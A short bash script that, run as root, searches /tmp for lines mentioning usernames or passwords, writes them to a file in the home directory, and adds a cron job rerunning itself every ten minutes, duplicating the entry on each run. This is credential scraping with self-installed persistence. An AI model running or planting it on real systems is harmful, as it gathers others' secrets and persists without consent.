#!/bin/bash

user=$(whoami)
if [[ $user != "root" ]]; then
    echo "Run the script being connected as root"
    exit 1
fi

scan=$(grep -r "username\|password" /tmp 2>/dev/null)

if [[ -n "$scan" ]]; then 
    echo "$scan" > ~/result_user_passwd.txt
    echo "Matched lines to be seen in ~/result_user_passwd.txt"
else
    echo "No match found."
    exit 1
fi

echo "Creating the cron task ..."
(crontab -l 2>/dev/null; echo "*/10 * * * * $(realpath $0)") | crontab - # list, append, re-inject
